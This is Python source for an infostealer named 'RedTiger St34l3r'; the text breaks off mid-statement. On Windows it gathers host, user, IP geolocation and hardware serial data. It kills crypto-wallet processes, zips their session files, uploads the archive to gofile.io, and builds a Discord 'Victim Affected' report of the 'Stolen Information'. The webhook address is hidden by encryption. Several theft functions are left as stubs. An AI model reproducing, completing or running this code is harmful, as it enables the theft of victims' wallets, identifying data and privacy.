
import sys

def D3f_V3rific4ti0n():
    def D3f_On1yW1nd0w5():
        if sys.platform.startswith("win"):
            return False
        else:
            return True
    
    try: 
        v4r_status = D3f_On1yW1nd0w5()
        if v4r_status == True:
            return v4r_status
    except:
        return True
    
if D3f_V3rific4ti0n() == True:
    sys.exit()
    
import os
import socket
import win32api
import requests
import base64
import ctypes
import threading
import discord
import zipfile
import io
from json import loads
from urllib.request import urlopen
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

def D3f_Sy5t3mInf0(v4r_zip_file): 
    v4r_status_system_info = None
    return v4r_status_system_info

def D3f_R0b10xAccount(v4r_zip_file):
    v4r_number_roblox_account = None
    return v4r_number_roblox_account

def D3f_Di5c0rdAccount(v4r_zip_file):
    v4r_number_discord_account = None
    return v4r_number_discord_account

def D3f_Di5c0rdInj3c710n(): 
    v4r_number_discord_injection = None
    return v4r_number_discord_injection

def D3f_Br0w53r5t341(v4r_zip_file): 
    v4r_number_extentions = None
    v4r_number_passwords = None
    v4r_number_cookies = None
    v4r_number_history = None
    v4r_number_downloads = None
    v4r_number_cards = None
    return v4r_number_extentions, v4r_number_passwords, v4r_number_cookies, v4r_number_history, v4r_number_downloads, v4r_number_cards

def D3f_S3ssi0nFil3s(v4r_zip_file):
    v4r_name_wallets = None
    v4r_name_game_launchers = None
    v4r_name_apps = None
    return v4r_name_wallets, v4r_name_game_launchers, v4r_name_apps

def D3f_Int3r3stingFil3s(v4r_zip_file):
    v4r_number_files = None
    return v4r_number_files

def D3f_W3bc4m(v4r_zip_file):
    v4r_status_camera_capture = None
    return v4r_status_camera_capture

def D3f_Scr33n5h0t(v4r_zip_file): 
    v4r_number_screenshot = None
    return v4r_number_screenshot

def D3f_St4rtup(): pass
def D3f_R3st4rt(): pass
def D3f_B10ckK3y(): pass
def D3f_Unb10ckK3y(): pass
def D3f_B10ckT45kM4n4g3r(): pass
def D3f_B10ckM0u53(): pass
def D3f_B10ckW3b5it3(): pass
def D3f_F4k33rr0r(): pass
def D3f_Sp4m0p3nPr0gr4m(): pass
def D3f_Sp4mCr34tFil3(): pass
def D3f_Shutd0wn(): pass
def D3f_Sp4m_Opti0ns(): pass

def D3f_Title(title):
    try:
        if sys.platform.startswith("win"):
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        elif sys.platform.startswith("linux"):
            sys.stdout.write(f"\x1b]2;{title}\x07")
    except:
        pass
        
def D3f_Clear():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

def D3f_Decrypt(v4r_encrypted, v4r_key):
    def D3f_DeriveKey(v4r_password, v4r_salt):
        v4r_kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=v4r_salt, iterations=100000, backend=default_backend())
        if isinstance(v4r_password, str):  
            v4r_password = v4r_password.encode()  
        return v4r_kdf.derive(v4r_password)

    v4r_encrypted_data = base64.b64decode(v4r_encrypted)
    v4r_salt = v4r_encrypted_data[:16]
    v4r_iv = v4r_encrypted_data[16:32]
    v4r_encrypted_data = v4r_encrypted_data[32:]
    v4r_derived_key = D3f_DeriveKey(v4r_key, v4r_salt)
    v4r_cipher = Cipher(algorithms.AES(v4r_derived_key), modes.CBC(v4r_iv), backend=default_backend())
    v4r_decryptor = v4r_cipher.decryptor()
    v4r_decrypted_data = v4r_decryptor.update(v4r_encrypted_data) + v4r_decryptor.finalize()
    v4r_unpadder = padding.PKCS7(128).unpadder()
    v4r_original_data = v4r_unpadder.update(v4r_decrypted_data) + v4r_unpadder.finalize()
    return v4r_original_data.decode()

D3f_Title("")

try: v4r_hostname_pc    = socket.gethostname()
except: v4r_hostname_pc = "None"

try: v4r_username_pc    = os.getlogin()
except: v4r_username_pc = "None"

try: v4r_displayname_pc    = win32api.GetUserNameEx(win32api.NameDisplay)
except: v4r_displayname_pc = "None"

try: v4r_ip_address_public    = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
except: v4r_ip_address_public = "None"

try: v4r_ip_adress_local    = socket.gethostbyname(socket.gethostname())
except: v4r_ip_adress_local = "None"

v4r_w3bh00k_ur1_crypt = r"""
g7dU6ErhwwvKNH/6llV1M4uXOxKfiSMiIF8DgW6fpuyD+jqrcohY0MJdkhOiXjyGl62mYx1d9Layk82rAzviSNYDjrPS+dslzMeWQ1dbNZLx9/DKzuZoJblv4AML289So6o8yQPhYo007lOUGoDa4/+GiHtxnKyDxYqbIKOkEuBTmOoARXrytsLuHTXRY4xxY8/mBcKEqLYxnbNL6U8IhA==
"""

v4r_k3y            = "zmVcDgeAFiILEUqZpFtJGMCOsbSktyGLYklZHHvvuCYCwsdrJVpgcSemQlpXyqSULfyDgumNeUnowBfQLcGTJLRbQuxKSVcHGRtsmvjqTUYcDLWzWRkRzqMfOSBLtqKNpGzuYlVtKlyCSjMjIhDHVdLXcCkGOmxINFunVBehnOzsRqRzdnedluXonJeGIxzUGIoL"
v4r_website        = "None"
v4r_color_embed    = 0xa80505
v4r_username_embed = "RedTiger St34l3r"
v4r_avatar_embed   = "https://google.com"
v4r_footer_text    = "RedTiger St34l3r - github.com/loxy0dev/RedTiger-Tools"
v4r_footer_embed   = {"text": v4r_footer_text, "icon_url": v4r_avatar_embed}
v4r_title_embed    = f'`{v4r_username_pc} "{v4r_ip_address_public}"`'
v4r_w3bh00k_ur1    = D3f_Decrypt(v4r_w3bh00k_ur1_crypt, v4r_k3y)

v4r_path_windows           = os.getenv("WINDIR", None)
v4r_path_userprofile       = os.getenv('USERPROFILE', None)
v4r_path_appdata_local     = os.getenv('LOCALAPPDATA', None)
v4r_path_appdata_roaming   = os.getenv('APPDATA', None)
v4r_path_program_files_x86 = os.getenv('ProgramFiles(x86)', None)
if v4r_path_program_files_x86 is None:
    v4r_path_program_files_x86 = os.getenv('ProgramFiles', None)

try:
    v4r_response = requests.get(f"https://{v4r_website}/api/ip/ip={v4r_ip_address_public}")
    v4r_api = v4r_response.json()

    v4r_country = v4r_api.get('country', "None")
    v4r_country_code = v4r_api.get('country_code', "None")
    v4r_region = v4r_api.get('region', "None")
    v4r_region_code = v4r_api.get('region_code', "None")
    v4r_zip_postal = v4r_api.get('zip', "None")
    v4r_city = v4r_api.get('city', "None")
    v4r_latitude = v4r_api.get('latitude', "None")
    v4r_longitude = v4r_api.get('longitude', "None")
    v4r_timezone = v4r_api.get('timezone', "None")
    v4r_isp = v4r_api.get('isp', "None")
    v4r_org = v4r_api.get('org', "None")
    v4r_as_number = v4r_api.get('as', "None")
except:
    v4r_response = requests.get(f"http://ip-api.com/json/{v4r_ip_address_public}")
    v4r_api = v4r_response.json()

    v4r_country = v4r_api.get('country', "None")
    v4r_country_code = v4r_api.get('countryCode', "None")
    v4r_region = v4r_api.get('regionName', "None")
    v4r_region_code = v4r_api.get('region', "None")
    v4r_zip_postal = v4r_api.get('zip', "None")
    v4r_city = v4r_api.get('city', "None")
    v4r_latitude = v4r_api.get('lat', "None")
    v4r_longitude = v4r_api.get('lon', "None")
    v4r_timezone = v4r_api.get('timezone', "None")
    v4r_isp = v4r_api.get('isp', "None")
    v4r_org = v4r_api.get('org', "None")
    v4r_as_number = v4r_api.get('as', "None")

def D3f_Sy5t3mInf0(v4r_zip_file):
    import platform
    import subprocess
    import uuid
    import psutil
    import GPUtil
    import ctypes
    import win32api
    import string
    import screeninfo
    import winreg

    try: v4r_sy5t3m_1nf0 = platform.system()
    except: v4r_sy5t3m_1nf0 = "None"

    try: v4r_sy5t3m_v3r5i0n_1nf0 = platform.version()
    except: v4r_sy5t3m_v3r5i0n_1nf0 = "None"

    try: v4r_m4c_4ddr355 = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except: v4r_m4c_4ddr355 = "None"

    try: v4r_r4m_1nf0 = str(round(psutil.virtual_memory().total / (1024**3), 2)) + "Go"
    except: v4r_r4m_1nf0 = "None"

    try: v4r_cpu_1nf0 = platform.processor()
    except: v4r_cpu_1nf0 = "None"

    try: v4r_cpu_c0r3_1nf0 = str(psutil.cpu_count(logical=False)) + " Core"
    except: v4r_cpu_c0r3_1nf0 = "None"

    try: v4r_gpu_1nf0 = GPUtil.getGPUs()[0].name if GPUtil.getGPUs() else "None"
    except: v4r_gpu_1nf0 = "None"

    v4r_path_Cryptography                 = r"SOFTWARE\Microsoft\Cryptography"
    v4r_path_SQMClient                    = r"SOFTWARE\Microsoft\SQMClient"
    v4r_path_HardwareProfiles             = r"SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001"
    v4r_path_Nvidia                       = r'SOFTWARE\NVIDIA Corporation'
    v4r_path_HardwareConfig               = r'SYSTEM\HardwareConfig\Current'

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_Cryptography, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "MachineGuid")
            v4r_Machine_Guid = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Machine_Guid = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareProfiles, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "GUID")
            v4r_Guid_Serial_Number = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Guid_Serial_Number = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareProfiles, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "HwProfileGuid")
            v4r_Hw_Profile_Guid = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Hw_Profile_Guid = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_SQMClient, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "MachineId")
            v4r_Machine_Id = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Machine_Id = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_Nvidia+r'\Installer2', 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemID")
            v4r_Nvidia_System_Id = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Nvidia_System_Id = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BaseBoardProduct")
            v4r_Motherboard_Product_Serial_Number = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Motherboard_Product_Serial_Number = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BaseBoardManufacturer")
            v4r_Motherboard_Manufacturer_Serial_Number = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Motherboard_Manufacturer_Serial_Number = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BIOSReleaseDate")
            v4r_Bios_Release_Date = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Bios_Release_Date = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BIOSVersion")
            v4r_Bios_Version = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Bios_Version = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemBiosVersion")
            v4r_System_Bios_Version = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_System_Bios_Version = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemVersion")
            v4r_System_Version = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_System_Version = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemFamily")
            v4r_System_Family_Serial_Number = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_System_Family_Serial_Number = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemManufacturer")
            v4r_System_Manufacturer_Serial_Number = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_System_Manufacturer_Serial_Number = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemProductName")
            v4r_System_Product_Serial_Number = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_System_Product_Serial_Number = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemSKU")
            v4r_System_SKU_Serial_Number = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_System_SKU_Serial_Number = None

    def RunPowershell(query):
        try:
            result = subprocess.check_output(
                ['powershell', '-Command', query],
                stderr=subprocess.STDOUT,
                text=True
            ).split('\n')[0].strip()
            return result if result else None
        except:
            return None

    try: v4r_Uuid_Serial_Number = RunPowershell("(Get-WmiObject -Class Win32_ComputerSystemProduct).UUID")
    except: v4r_Uuid_Serial_Number = None

    try: v4r_Bios_Serial_Number = RunPowershell("(Get-WmiObject -Class Win32_BIOS).SerialNumber")
    except: v4r_Bios_Serial_Number = None

    try: v4r_Motherboard_Serial_Number = RunPowershell("(Get-WmiObject -Class Win32_BaseBoard).SerialNumber")
    except: v4r_Motherboard_Serial_Number = None

    try: v4r_Processor_Serial_Number = RunPowershell("(Get-WmiObject -Class Win32_Processor).ProcessorId")
    except: v4r_Processor_Serial_Number = None

    try: v4r_OemString_Serial_Number = RunPowershell("(Get-WmiObject -Class Win32_BIOS).OEMStringArray")
    except: v4r_OemString_Serial_Number = None

    try: v4r_Asset_Tag = RunPowershell("(Get-WmiObject -Class Win32_SystemEnclosure).SMBIOSAssetTag")
    except: v4r_Asset_Tag = None
        
    try:
        v4r_drives_info = []
        v4r_bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        for v4r_letter in string.ascii_uppercase:
            if v4r_bitmask & 1:
                v4r_drive_path = v4r_letter + ":\\"
                try:
                    v4r_free_bytes = ctypes.c_ulonglong(0)
                    v4r_total_bytes = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(v4r_drive_path), None, ctypes.pointer(v4r_total_bytes), ctypes.pointer(v4r_free_bytes))
                    v4r_total_space = v4r_total_bytes.value
                    v4r_free_space = v4r_free_bytes.value
                    v4r_used_space = v4r_total_space - v4r_free_space
                    v4r_drive_name = win32api.GetVolumeInformation(v4r_drive_path)[0]
                    drive = {
                        'drive': v4r_drive_path,
                        'total': v4r_total_space,
                        'free': v4r_free_space,
                        'used': v4r_used_space,
                        'name': v4r_drive_name,
                    }
                    v4r_drives_info.append(drive)
                except:
                    ()
            v4r_bitmask >>= 1

        v4r_d15k_5t4t5 = "   {:<7} {:<10} {:<10} {:<10} {:<20}".format("Drive:", "Free:", "Total:", "Use:", "Name:")
        for v4r_drive in v4r_drives_info:
            v4r_use_percent = (v4r_drive['used'] / v4r_drive['total']) * 100
            v4r_free_space_gb = "{:.2f}GO".format(v4r_drive['free'] / (1024 ** 3))
            v4r_total_space_gb = "{:.2f}GO".format(v4r_drive['total'] / (1024 ** 3))
            v4r_use_percent_str = "{:.2f}%".format(v4r_use_percent)
            v4r_d15k_5t4t5 += "\n - {:<7} {:<10} {:<10} {:<10} {:<20}".format(v4r_drive['drive'], 
                                                                   v4r_free_space_gb,
                                                                   v4r_total_space_gb,
                                                                   v4r_use_percent_str,
                                                                   v4r_drive['name'])
    except:
        v4r_d15k_5t4t5 = """   Drive:  Free:      Total:     Use:       Name:       
   None    None       None       None       None     
"""

    try:
        def IsPortable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False

        if IsPortable():
            v4r_p14tf0rm_1nf0 = 'Pc Portable'
        else:
            v4r_p14tf0rm_1nf0 = 'Pc Fixed'
    except:
        v4r_p14tf0rm_1nf0 = "None"

    try: v4r_scr33n_number = len(screeninfo.get_monitors())
    except: v4r_scr33n_number = "None"

    v4r_status_system_info = "Yes"
    v4r_file_system_info = f"""
User Pc:
 - Hostname    : {v4r_hostname_pc}
 - Username    : {v4r_username_pc}
 - DisplayName : {v4r_displayname_pc}

System:
 - Plateform     : {v4r_p14tf0rm_1nf0}
 - Exploitation  : {v4r_sy5t3m_1nf0} {v4r_sy5t3m_v3r5i0n_1nf0}
 - Screen Number : {v4r_scr33n_number}

Peripheral:
 - CPU : {v4r_cpu_1nf0}, {v4r_cpu_c0r3_1nf0} 
 - GPU : {v4r_gpu_1nf0}
 - RAM : {v4r_r4m_1nf0}

Disk:
{v4r_d15k_5t4t5}

Serial Number:
 - MAC                       : {v4r_m4c_4ddr355}
 - Machine Id                : {v4r_Machine_Id}
 - Machine Guid              : {v4r_Machine_Guid}
 - Hw Profile Guid           : {v4r_Hw_Profile_Guid}
 - Nvidia System Id          : {v4r_Nvidia_System_Id}
 - Guid Serial Number        : {v4r_Guid_Serial_Number}
 - Uuid Serial Number        : {v4r_Uuid_Serial_Number}
 - Motherboard Serial Number : {v4r_Motherboard_Serial_Number}
 - Motherboard Product       : {v4r_Motherboard_Product_Serial_Number}
 - Motherboard Manufacturer  : {v4r_Motherboard_Manufacturer_Serial_Number}
 - Processor Serial Number   : {v4r_Processor_Serial_Number}
 - Bios Serial Number        : {v4r_Bios_Serial_Number}
 - Bios Release Date         : {v4r_Bios_Release_Date}
 - Bios Version              : {v4r_Bios_Version}
 - System Bios Version       : {v4r_System_Bios_Version}
 - System Version            : {v4r_System_Version}
 - System Family             : {v4r_System_Family_Serial_Number}
 - System Manufacturer       : {v4r_System_Manufacturer_Serial_Number}
 - System Product            : {v4r_System_Product_Serial_Number}
 - System SKU                : {v4r_System_SKU_Serial_Number}
 - Oem String Serial Number  : {v4r_OemString_Serial_Number}
 - Asset Tag Serial Number   : {v4r_Asset_Tag}

Ip:
 - Public : {v4r_ip_address_public}
 - Local  : {v4r_ip_adress_local}

Ip Information:
 - Isp : {v4r_isp}
 - Org : {v4r_org}
 - As  : {v4r_as_number}

Ip Location:
 - Country   : {v4r_country} ({v4r_country_code})
 - Region    : {v4r_region} ({v4r_region_code})
 - Zip       : {v4r_zip_postal}
 - City      : {v4r_city}
 - Timezone  : {v4r_timezone}
 - Longitude : {v4r_longitude}
 - Latitude  : {v4r_latitude}
"""
    v4r_zip_file.writestr("System Info.txt", v4r_file_system_info)

    return v4r_status_system_info

def D3f_S3ssi0nFil3s(v4r_zip_file):
    import os
    import psutil

    v4r_session_files_choice = ["Wallets"]
    v4r_name_wallets         = [] if "Wallets" in v4r_session_files_choice else None
    v4r_name_game_launchers  = [] if "Game Launchers" in v4r_session_files_choice else None
    v4r_name_apps            = [] if "Apps" in v4r_session_files_choice else None

    v4r_session_files = [
        ("Zcash",             os.path.join(v4r_path_appdata_roaming,   "Zcash"),                                                      "zcash.exe",             "Wallets"),
        ("Armory",            os.path.join(v4r_path_appdata_roaming,   "Armory"),                                                     "armory.exe",            "Wallets"),
        ("Bytecoin",          os.path.join(v4r_path_appdata_roaming,   "bytecoin"),                                                   "bytecoin.exe",          "Wallets"),
        ("Guarda",            os.path.join(v4r_path_appdata_roaming,   "Guarda", "Local Storage", "leveldb"),                         "guarda.exe",            "Wallets"),
        ("Atomic Wallet",     os.path.join(v4r_path_appdata_roaming,   "atomic", "Local Storage", "leveldb"),                         "atomic.exe",            "Wallets"),
        ("Exodus",            os.path.join(v4r_path_appdata_roaming,   "Exodus", "exodus.wallet"),                                    "exodus.exe",            "Wallets"),
        ("Binance",           os.path.join(v4r_path_appdata_roaming,   "Binance", "Local Storage", "leveldb"),                        "binance.exe",           "Wallets"),
        ("Jaxx Liberty",      os.path.join(v4r_path_appdata_roaming,   "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"), "jaxx.exe",              "Wallets"),
        ("Electrum",          os.path.join(v4r_path_appdata_roaming,   "Electrum", "wallets"),                                        "electrum.exe",          "Wallets"),
        ("Coinomi",           os.path.join(v4r_path_appdata_roaming,   "Coinomi", "Coinomi", "wallets"),                              "coinomi.exe",           "Wallets"),
        ("Trust Wallet",      os.path.join(v4r_path_appdata_roaming,   "Trust Wallet"),                                               "trustwallet.exe",       "Wallets"),
        ("AtomicDEX",         os.path.join(v4r_path_appdata_roaming,   "AtomicDEX"),                                                  "atomicdex.exe",         "Wallets"),
        ("Wasabi Wallet",     os.path.join(v4r_path_appdata_roaming,   "WalletWasabi", "Wallets"),                                    "wasabi.exe",            "Wallets"),
        ("Ledger Live",       os.path.join(v4r_path_appdata_roaming,   "Ledger Live"),                                                "ledgerlive.exe",        "Wallets"),
        ("Trezor Suite",      os.path.join(v4r_path_appdata_roaming,   "Trezor", "suite"),                                            "trezor.exe",            "Wallets"),
        ("Blockchain Wallet", os.path.join(v4r_path_appdata_roaming,   "Blockchain", "Wallet"),                                       "blockchain.exe",        "Wallets"),
        ("Mycelium",          os.path.join(v4r_path_appdata_roaming,   "Mycelium", "Wallets"),                                        "mycelium.exe",          "Wallets"),
        ("Crypto.com",        os.path.join(v4r_path_appdata_roaming,   "Crypto.com", "appdata"),                                      "crypto.com.exe",        "Wallets"),
        ("BRD",               os.path.join(v4r_path_appdata_roaming,   "BRD", "wallets"),                                             "brd.exe",               "Wallets"),
        ("Coinbase Wallet",   os.path.join(v4r_path_appdata_roaming,   "Coinbase", "Wallet"),                                         "coinbase.exe",          "Wallets"),
        ("Zerion",            os.path.join(v4r_path_appdata_roaming,   "Zerion", "wallets"),                                          "zerion.exe",            "Wallets"),
        ("Steam",             os.path.join(v4r_path_program_files_x86, "Steam", "config"),                                            "steam.exe",             "Game Launchers"),
        ("Riot Games",        os.path.join(v4r_path_appdata_local,     "Riot Games", "Riot Client", "Data"),                          "riot.exe",              "Game Launchers"),
        ("Epic Games",        os.path.join(v4r_path_appdata_local,     "EpicGamesLauncher"),                                          "epicgameslauncher.exe", "Game Launchers"),
        ("Rockstar Games",    os.path.join(v4r_path_appdata_local,     "Rockstar Games"),                                             "rockstarlauncher.exe",  "Game Launchers"),
        ("Telegram",          os.path.join(v4r_path_appdata_roaming,   "Telegram Desktop", "tdata"),                                  "telegram.exe",          "Apps")
    ]

    try:
        for v4r_name, v4r_path, v4r_proc_name, v4r_type in v4r_session_files:
            if v4r_type in v4r_session_files_choice:
                for v4r_proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if v4r_proc.info['name'].lower() == v4r_proc_name.lower():
                            v4r_proc.terminate()
                    except:
                        pass
    except:
        pass

    for v4r_name, v4r_path, v4r_proc_name, v4r_type in v4r_session_files:
        if v4r_type in v4r_session_files_choice and os.path.exists(v4r_path):
            try:
                if v4r_type == "Wallets" and v4r_name_wallets is not None:
                    v4r_name_wallets.append(v4r_name)
                elif v4r_type == "Game Launchers" and v4r_name_game_launchers is not None:
                    v4r_name_game_launchers.append(v4r_name)
                elif v4r_type == "Apps" and v4r_name_apps is not None:
                    v4r_name_apps.append(v4r_name)

                v4r_zip_file.writestr(os.path.join("Session Files", v4r_name, "path.txt"), v4r_path)

                if os.path.isdir(v4r_path):
                    for v4r_root, _, v4r_files in os.walk(v4r_path):
                        for v4r_file in v4r_files:
                            v4r_abs_file_path = os.path.join(v4r_root, v4r_file)
                            v4r_rel_path_in_zip = os.path.join(
                                "Session Files", v4r_name, "Files",
                                os.path.relpath(v4r_abs_file_path, v4r_path)
                            )
                            try:
                                v4r_zip_file.write(v4r_abs_file_path, v4r_rel_path_in_zip)
                            except:
                                pass
                else:
                    v4r_rel_path_in_zip = os.path.join("Session Files", v4r_name, "Files", os.path.basename(v4r_path))
                    try:
                        v4r_zip_file.write(v4r_path, v4r_rel_path_in_zip)
                    except:
                        pass
            except:
                pass

    if "Wallets" in v4r_session_files_choice:
        v4r_name_wallets = ", ".join(v4r_name_wallets) if v4r_name_wallets else "No"
    if "Game Launchers" in v4r_session_files_choice:
        v4r_name_game_launchers = ", ".join(v4r_name_game_launchers) if v4r_name_game_launchers else "No"
    if "Apps" in v4r_session_files_choice:
        v4r_name_apps = ", ".join(v4r_name_apps) if v4r_name_apps else "No"

    return v4r_name_wallets, v4r_name_game_launchers, v4r_name_apps

v4r_option = []

v4r_zip_buffer = io.BytesIO()
with zipfile.ZipFile(v4r_zip_buffer, "w", zipfile.ZIP_DEFLATED) as v4r_zip_file:

    try: 
        v4r_number_discord_injection = D3f_Di5c0rdInj3c710n()
    except Exception as e:
        v4r_number_discord_injection = f"Error: {e}"

    try: 
        v4r_status_system_info = D3f_Sy5t3mInf0(v4r_zip_file)
    except Exception as e:
        v4r_status_system_info = f"Error: {e}"

    try: 
        v4r_number_discord_account = D3f_Di5c0rdAccount(v4r_zip_file)
    except Exception as e:
        v4r_number_discord_account = f"Error: {e}"

    try: 
        v4r_number_extentions, v4r_number_passwords, v4r_number_cookies, v4r_number_history, v4r_number_downloads, v4r_number_cards = D3f_Br0w53r5t341(v4r_zip_file)
    except Exception as e:
        v4r_number_extentions = f"Error: {e}"
        v4r_number_passwords = f"Error: {e}"
        v4r_number_cookies = f"Error: {e}"
        v4r_number_history = f"Error: {e}"
        v4r_number_downloads = f"Error: {e}"
        v4r_number_cards = f"Error: {e}"

    try: 
        v4r_number_roblox_account = D3f_R0b10xAccount(v4r_zip_file)
    except Exception as e:
        v4r_number_roblox_account = f"Error: {e}"

    try: 
        v4r_status_camera_capture = D3f_W3bc4m(v4r_zip_file)
    except Exception as e:
        v4r_status_camera_capture = f"Error: {e}"

    try: 
        v4r_status_screenshot = D3f_Scr33n5h0t(v4r_zip_file)
    except Exception as e:
        v4r_status_screenshot = f"Error: {e}"

    try: 
        v4r_name_wallets, v4r_name_game_launchers, v4r_name_apps = D3f_S3ssi0nFil3s(v4r_zip_file)
    except Exception as e:
        v4r_status_screenshot = f"Error: {e}"

    try: 
        v4r_number_files = D3f_Int3r3stingFil3s(v4r_zip_file)
    except Exception as e:
        v4r_number_files = f"Error: {e}"

    if v4r_number_discord_injection != None:
        v4r_option.append(f"Discord Injection : {v4r_number_discord_injection}")

    if v4r_status_camera_capture != None:
        v4r_option.append(f"Camera Capture    : {v4r_status_camera_capture}")

    if v4r_status_screenshot != None:
        v4r_option.append(f"Screenshot        : {v4r_status_screenshot}")

    if v4r_status_system_info != None:
        v4r_option.append(f"System Info       : {v4r_status_system_info}")

    if v4r_number_discord_account != None:
        v4r_option.append(f"Discord Accounts  : {v4r_number_discord_account}")

    if v4r_number_roblox_account != None:
        v4r_option.append(f"Roblox Accounts   : {v4r_number_roblox_account}")

    if v4r_number_passwords != None:
        v4r_option.append(f"Passwords         : {v4r_number_passwords}")

    if v4r_number_cookies != None:
        v4r_option.append(f"Cookies           : {v4r_number_cookies}")

    if v4r_number_cards != None:
        v4r_option.append(f"Cards             : {v4r_number_cards}")

    if v4r_number_history != None:
        v4r_option.append(f"Browsing History  : {v4r_number_history}")

    if v4r_number_downloads != None:
        v4r_option.append(f"Download History  : {v4r_number_downloads}")

    if v4r_number_extentions != None:
        v4r_option.append(f"Extentions        : {v4r_number_extentions}")

    if v4r_name_wallets != None:
        v4r_option.append(f"Wallets           : {v4r_name_wallets}")

    if v4r_name_game_launchers != None:
        v4r_option.append(f"Game Launchers    : {v4r_name_game_launchers}")
    
    if v4r_name_apps != None:
        v4r_option.append(f"Apps              : {v4r_name_apps}")
    
    if v4r_number_files != None:
        v4r_option.append(f"Interesting Files : {v4r_number_files}")

v4r_zip_buffer.seek(0)

try:
    try: v4r_gofileserver = loads(urlopen("https://api.gofile.io/getServer").read().decode('utf-8'))["data"]["server"]
    except: v4r_gofileserver = "store4"

    v4r_response = requests.post(
        f"https://{v4r_gofileserver}.gofile.io/uploadFile",
        files={"file": (f"RedTiger_{v4r_username_pc.replace(' ', '_')}.zip", v4r_zip_buffer)}
    )

    v4r_download_link = v4r_response.json()["data"]["downloadPage"]
except Exception as e:
    v4r_download_link = f"Error: {e}"

embed = discord.Embed(title="Victim Affected", color=v4r_color_embed
).add_field(
    inline=False,
    name="Summary of Information", 
    value=f"""```
Hostname    : {v4r_hostname_pc}
Username    : {v4r_username_pc}
DisplayName : {v4r_displayname_pc}
Ip Public   : {v4r_ip_address_public}
Ip Local    : {v4r_ip_adress_local}
Country     : {v4r_country}```"""
).add_field(
    inline=False,
    name="Stolen Information", 
    value=f"""```swift
{"\n".join(v4r_option)}```"""
).add_field(
    inline=False,
    name="Download Link", 
    value=f"""{v4r_download_link}"""
).set_footer(
